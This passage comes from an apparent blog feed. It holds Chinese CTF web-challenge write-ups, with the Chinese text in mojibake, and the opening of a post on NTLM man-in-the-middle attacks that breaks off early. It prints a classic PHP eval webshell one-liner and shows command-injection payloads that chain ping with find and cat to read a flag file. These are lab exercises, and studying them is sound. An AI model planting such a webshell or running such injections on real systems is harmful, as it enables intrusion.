‡ç­¾è®¾ä¸ºdisabledï¼Œç‚¹å‡»æŒ‰é’®æ‰§è¡ŒåŠ¨ä½œï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹æœ¬åœ°çš„å…ƒç´ ä¸ºenable</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231601449.png" alt="image-20220607231601449" /></p><p>ä¹Ÿå¯ä»¥<strong>åˆ†æç‚¹å‡»æŒ‰é’®çš„è¡Œä¸º</strong>ï¼Œè¿™é‡Œç‚¹å‡»flagæŒ‰é’®åä¼šå‘è¯¥é¡µé¢<strong>ä»¥POSTæäº¤auth=flagçš„è¡¨å•æ•°æ®</strong>ï¼Œå¯ä»¥ä¸»åŠ¨å‘é€è¯¥è¯·æ±‚</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607232508454.png" alt="image-20220607232508454" /></p><hr /><h1 id="weak_auth"><a class="markdownIt-Anchor" href="#weak_auth"></a> weak_auth</h1><p>ç™»å½•é¡µé¢ï¼Œéšä¾¿è¾“å…¥æç¤ºç”¨æˆ·åä¸ºadminï¼Œå†æ¬¡ç™»å½•æç¤ºä½¿ç”¨å­—å…¸ï¼Œå¼±å£ä»¤çˆ†ç ´</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607233644435.png" alt="image-20220607233644435" /></p><p>ç”¨Burpä¸­Intruderæ¨¡å—è¿›è¡Œå­—å…¸çˆ†ç ´(<strong>å‰ææœ‰å¼±å£ä»¤å­—å…¸</strong>)å¯†ç ä¸º<strong>123456</strong></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608000246499.png" alt="image-20220608000246499" /></p><hr /><h1 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h1><p>åœ¨phpä¸­ == æˆ–è€… &lt; å’Œ &gt; éƒ½æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œåªä¼š<strong>æ¯”è¾ƒå€¼ä¸æ¯”è¾ƒç±»å‹</strong></p><blockquote><p>ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼ŒPHPä¼šæŠŠ<strong>å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—</strong>å†è¿›è¡Œæ¯”è¾ƒ<br />PHPè½¬æ¢çš„è§„åˆ™çš„æ˜¯ï¼š<strong>è‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å‰é¢æ‰€æœ‰æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™ä¸º0</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">0e12345</span> == <span class="hljs-number">0e54321</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;abcd&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;1abc&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>0eå¼€å¤´åœ¨phpè§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»Ÿä¸€å˜ä¸º0ï¼Œæ‰€ä»¥ç›¸ç­‰(å¸¸åœ¨md5æ¯”è¾ƒä¸­ç»•è¿‡ä½¿ç”¨)</p><p>is_numericå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸º<strong>æ•°å­—</strong>æˆ–è€…**æ•°å­—å­—ç¬¦ä¸² **(åè¿›åˆ¶å’Œåå…­è¿›åˆ¶)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x233333</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x233333&quot;</span>);   <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æºç æ„é€ payload</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608011650618.png" alt="image-20220608011650618" /></p><p>å…¶ä¸­*ä¸ºé™¤æ•°å­—å¤–çš„ä»»æ„å­—ç¬¦</p><hr /><h1 id="xff_referer"><a class="markdownIt-Anchor" href="#xff_referer"></a> xff_referer</h1><p>xffä¸º<strong>X-Forwarder-For</strong>ï¼Œä¸ºhttpæŠ¥æ–‡è¯·æ±‚å¤´æ ¼å¼çš„ä¸€ç§ï¼Œç”¨æ¥è¯†åˆ«åœ¨ä»£ç†æœåŠ¡æ¨¡å¼ä¸‹<strong>å®¢æˆ·ç«¯çš„çœŸå®ip</strong></p><p><strong>referer</strong>å­—æ®µè¡¨ç¤ºé¡µé¢æ¥æºåœ°å€ï¼Œåœ¨hackbarä¸­æ·»åŠ å¦‚ä¸‹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆedgeä¸‹çš„å‘åŒ…æœ‰é—®é¢˜ ğŸ˜“</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608103355127.png" alt="image-20220608103355127" /></p><hr /><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h1><p>ç»å…¸ä¸€å¥è¯æœ¨é©¬çš„webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨å„ç§webshellå·¥å…·è¿æ¥ï¼Œè¿™é‡Œç”¨antsword</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608104258600.png" alt="image-20220608104258600" /></p><p>è¿›å»å‘ç°è¯¥ç¯å¢ƒä¸å‡ºç½‘ï¼Œæ— æ³•åå¼¹shellï¼Œç›´æ¥å¾—flagå®Œäº‹</p><hr /><h1 id="command_execution"><a class="markdownIt-Anchor" href="#command_execution"></a> command_execution</h1><p>å…¸å‹çš„å‘½ä»¤æ³¨å…¥ï¼Œæ­£å¸¸çš„pingåé¢æ³¨å…¥å®ç°RCE</p><p>linuxä¸­é€šè¿‡å‘½ä»¤æ“ä½œç¬¦æ¥å®ç°</p><h3 id="å’Œå·æ“ä½œç¬¦"><a class="markdownIt-Anchor" href="#å’Œå·æ“ä½œç¬¦"></a> &quot;&amp;&quot;å’Œå·æ“ä½œç¬¦</h3><p>â€˜<strong>&amp;</strong>â€™çš„ä½œç”¨æ˜¯ä½¿å‘½ä»¤åœ¨åå°è¿è¡Œã€‚åªè¦åœ¨å‘½ä»¤åé¢è·Ÿä¸Šä¸€ä¸ªç©ºæ ¼å’Œ â€˜<strong>&amp;</strong>â€™ã€‚ä¹Ÿå¯ä»¥ä¸€æ¬¡æ€§åœ¨åå°<strong>åŒæ—¶</strong>è¿è¡Œå¤šä¸ªå‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com &amp; apt-get update &amp;  <br></code></pre></td></tr></table></figure><h3 id="åˆ†å·æ“ä½œç¬¦"><a class="markdownIt-Anchor" href="#åˆ†å·æ“ä½œç¬¦"></a> &quot;;&quot;åˆ†å·æ“ä½œç¬¦</h3><p>ä½¿ç”¨â€™<strong>;</strong>'å°†å‘½ä»¤åˆ†å‰²ï¼Œä½¿å¾—å„ä¸ªå‘½ä»¤<strong>ä¾æ¬¡æ‰§è¡Œ</strong>ï¼Œè¾“å‡ºç»“æœï¼Œ<strong>äº’ä¸å½±å“</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 127.0.0.1;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h3 id="ä¸æ“ä½œç¬¦"><a class="markdownIt-Anchor" href="#ä¸æ“ä½œç¬¦"></a> &quot;&amp;&amp;&quot;ä¸æ“ä½œç¬¦</h3><p>å¦‚æœç¬¬ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œ<strong>ä¸æ“ä½œç¬¦ (&amp;&amp;)<strong>æ‰ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤é€€å‡ºçŠ¶æ€æ˜¯</strong>0</strong>, è¯¥æ“ä½œç¬¦åœ¨æ£€æŸ¥æœ€åä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€æ—¶å¾ˆæœ‰ç”¨</p><p>ç¨‹åºç¼–è¯‘å®‰è£…(å…ˆæ£€æŸ¥ç¼–è¯‘æƒ…å†µ)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>ç½‘ç«™è®¿é—®(å…ˆåˆ¤æ–­ä¸»æœºæ˜¯å¦åœ¨çº¿)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 www.baidu.com &amp;&amp; links www.baidu.com<br></code></pre></td></tr></table></figure><h3 id="æˆ–æ“ä½œç¬¦"><a class="markdownIt-Anchor" href="#æˆ–æ“ä½œç¬¦"></a> &quot;||&quot;æˆ–æ“ä½œç¬¦</h3><p><strong>æˆ–æ“ä½œç¬¦</strong> (<strong>||</strong>)å¾ˆåƒç¼–ç¨‹ä¸­çš„ <strong>if-else</strong> è¯­å¥, è¯¥æ“ä½œç¬¦å…è®¸ä½ åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤å¤±è´¥çš„æƒ…å†µä¸‹(<strong>é€€å‡ºçŠ¶æ€ä¸º1</strong>)æ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ã€‚ä½†ç¬¬ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸ(é€€å‡ºçŠ¶æ€ä¸º<strong>0</strong>)å°±ä¸ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤ï¼Œæ•ˆæœä¸º<strong>è‡³å°‘å¾—æœ‰ä¸€ä¸ªæŒ‡ä»¤æ‰§è¡ŒæˆåŠŸ</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update ||<span class="hljs-built_in"> ping </span>-c3 www.baidu<span class="hljs-built_in">..</span>com<br></code></pre></td></tr></table></figure><h3 id="ç®¡é“æ“ä½œç¬¦"><a class="markdownIt-Anchor" href="#ç®¡é“æ“ä½œç¬¦"></a> &quot;|&quot;ç®¡é“æ“ä½œç¬¦</h3><p>ç®¡é“æ“ä½œç¬¦(<strong>|</strong>)ä¼šå°†ç¬¬ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥ç»“æœä½œä¸ºç¬¬äºŒä¸ªæŒ‡ä»¤çš„è¾“å…¥ï¼Œæœ€ç»ˆåœ¨å±å¹•ä¸­å±•ç¤ºçš„æ˜¯<strong>æœ€åä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºæƒ…å†µ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> system.log | grep hello<br></code></pre></td></tr></table></figure><blockquote><p>ä¸Šé¢çš„æŒ‡ä»¤å¯ä»¥è®©æˆ‘ä»¬è¿‡æ»¤å‡º<code>system.log</code>è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«<code>hello</code>å­—ç¬¦ä¸²çš„è¡Œï¼Œç„¶åæ‰“å°åˆ°å±å¹•ä¸Šã€‚</p></blockquote><p>æœ¬é¢˜å¯ä»¥é€šè¿‡ç®¡é“æ“ä½œç¬¦**(|)<strong>æˆ–è€…ä¸æ“ä½œç¬¦</strong>(&amp;&amp;)<strong>å’Œåˆ†å·æ“ä½œç¬¦</strong>(ğŸ˜‰**å®ç°å‘½ä»¤æ³¨å…¥</p><p>é¦–å…ˆæ‰¾åˆ°flagçš„ä½ç½®ä¸º <strong>/home/flag.txt</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1;find / -name <span class="hljs-string">&quot;flag&quot;</span><br>127.0.0.1 | find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br>127.0.0.1 &amp;&amp; find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br></code></pre></td></tr></table></figure><p>è·å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">cat</span> /home/flag.txt<br></code></pre></td></tr></table></figure><hr /><h1 id="simple_js"><a class="markdownIt-Anchor" href="#simple_js"></a> simple_js</h1><p>å®¡é˜…jsä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>)&#123;<br>        <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>        <span class="hljs-keyword">var</span> tab  = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>        <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i,j,k,l=<span class="hljs-number">0</span>,m,n,o,p = <span class="hljs-string">&quot;&quot;</span>;<br>    i = <span class="hljs-number">0</span>;<br>    j = tab.<span class="hljs-property">length</span>;<br>        k = j + (l) + (n=<span class="hljs-number">0</span>);<br>        n = tab2.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>            o = tab[i-l];<br>            p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>           o = tab[i-l];<br>           <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k-<span class="hljs-number">1</span>) p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>        &#125;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>        pass = p;<br>    <span class="hljs-keyword">return</span> pass;<br>    &#125;<br>    <span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>    h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br>    <span class="hljs-title function_">alert</span>( <span class="hljs-title function_">dechiffre</span>(h) );<br></code></pre></td></tr></table></figure><p>ä¹çœ¼ä¸€çœ‹å¾ˆå¤æ‚ï¼Œç»™äº†å¾ˆå¤šæ··æ·†ï¼Œè¦å¼„æ¸…æ¥šä»£ç çš„æ„å›¾ï¼›ä»è¾“å…¥ä»€ä¹ˆè¿”å›å€¼ä¸å˜è¿™ä¸€è§’åº¦è§¦å‘ï¼Œæ•…è¿›è¡Œæ— ç”¨ä»£ç çš„å¤„ç†ç®€åŒ–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å°±æ˜¯å°†ä¸€ä¸ªå›ºå®šæ•°å­—æ•°ç»„è¿›è¡ŒASCâ…¡å­—ç¬¦ç¼–ç åæ‹¼æ¥ï¼Œä¸æˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰ä»»ä½•å…³ç³»</p><p>é¢˜ç›®ä¸­ç»™å‡ºå¯ç–‘çš„<strong>16è¿›åˆ¶å­—ç¬¦ä¸²</strong>ï¼Œå°†å˜é‡æ›¿æ¢æ‰§è¡Œ</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-string">&quot;<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x36</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x37</span>\x2c<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x30</span>&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> p;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-title function_">dechiffre</span>());</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»¥htmlæ–¹å¼æ‰“å¼€</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608153642079.png" alt="image-20220608153642079" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäºNTLMçš„ä¸­é—´äººæ”»å‡»</title>
    <link href="/2022/06/02/MITM/"/>
    <url>/2022/06/02/MITM/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸­é—´äººæ”»å‡»"><a class="markdownIt-Anchor" href="#ä¸­é—´äººæ”»å‡»"></a> ä¸­é—´äººæ”»å‡»</h1><p>ä¸­é—´äººæ”»å‡»(Man-in-the-Middle Attackï¼Œç®€ç§°â€œ<strong>MITM</strong>æ”»å‡»â€)æ˜¯æŒ‡æ”»å‡»è€…ä¸é€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿æ¥ä¸å¯¹æ–¹ç›´æ¥å¯¹è¯ï¼Œä½†äº‹å®ä¸Šæ•´ä¸ªä¼šè¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æ§åˆ¶ã€‚åœ¨ä¸­é—´äººæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šè®¯åŒæ–¹çš„é€šè¯å¹¶æ’å…¥æ–°çš„å†…å®¹ã€‚ä¸­é—´äººæ”»å‡»ä¸€ä¸ª(ç¼ºä¹)ç›¸äº’è®¤è¯çš„æ”»å‡»ã€‚å¤§å¤šæ•°çš„åŠ å¯†åè®®éƒ½ä¸“é—¨åŠ å…¥äº†ä¸€äº›ç‰¹æ®Šçš„è®¤è¯æ–¹æ³•ä»¥é˜»æ­¢ä¸­é—´äººæ”»å‡»ã€‚ä¾‹å¦‚ï¼ŒSSLåè®®å¯ä»¥éªŒè¯å‚ä¸é€šè®¯çš„ä¸€æ–¹æˆ–åŒæ–¹ä½¿ç”¨çš„è¯ä¹¦æ˜¯å¦æ˜¯ç”±æƒå¨çš„å—ä¿¡ ä»»çš„æ•°å­—è¯ä¹¦è®¤è¯æœºæ„é¢å‘ï¼Œå¹¶ä¸”èƒ½æ‰§è¡ŒåŒå‘èº«ä»½è®¤è¯ã€‚</p><p>ä¸­é—´äººæ”»å‡»è¿‡ç¨‹</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>å®¢æˆ·ç«¯å‘é€è¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼Œè¯·æ±‚è¢«ä¸­é—´äººæˆªè·ã€‚<br><span class="hljs-number">2.</span>æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€å…¬é’¥ã€‚<br><span class="hljs-number">3.</span>ä¸­é—´äººæˆªè·å…¬é’¥ï¼Œä¿ç•™åœ¨è‡ªå·±æ‰‹ä¸Šã€‚ç„¶åè‡ªå·±ç”Ÿæˆä¸€ä¸ªã€ä¼ªé€ çš„ã€‘å…¬é’¥ï¼Œå‘ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">4.</span>å®¢æˆ·ç«¯æ”¶åˆ°ä¼ªé€ çš„å…¬é’¥åï¼Œç”ŸæˆåŠ å¯†<span class="hljs-built_in">hash</span>å€¼å‘ç»™æœåŠ¡å™¨ã€‚<br><span class="hljs-number">5.</span>ä¸­é—´äººè·å¾—åŠ å¯†<span class="hljs-built_in">hash</span>å€¼ï¼Œç”¨è‡ªå·±çš„ç§é’¥è§£å¯†è·å¾—çœŸç§˜é’¥ã€‚åŒæ—¶ç”Ÿæˆå‡çš„åŠ å¯†<span class="hljs-built_in">hash</span>å€¼ï¼Œå‘ç»™æœåŠ¡å™¨ã€‚<br><span class="hljs-number">6.</span>æœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†è·å¾—å‡å¯†é’¥ã€‚ç„¶ååŠ å¯†æ•°æ®ä¼ è¾“ç»™å®¢æˆ·ç«¯ã€‚<br></code></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png" alt="image-20210802165409819" style="zoom: 67%;" /><blockquote><p><em><strong>ä¸­é—´äººæ”»å‡»çš„æ ¸å¿ƒç†å¿µåœ¨äºæˆªå–hashå’Œä¼ é€’(å‡å†’è®¤è¯)</strong></em></p></blockquote><h2 id="0x01-åŸŸå’Œå·¥ä½œç»„"><a class="markdownIt-Anchor" href="#0x01-åŸŸå’Œå·¥ä½œç»„"></a> 0x01 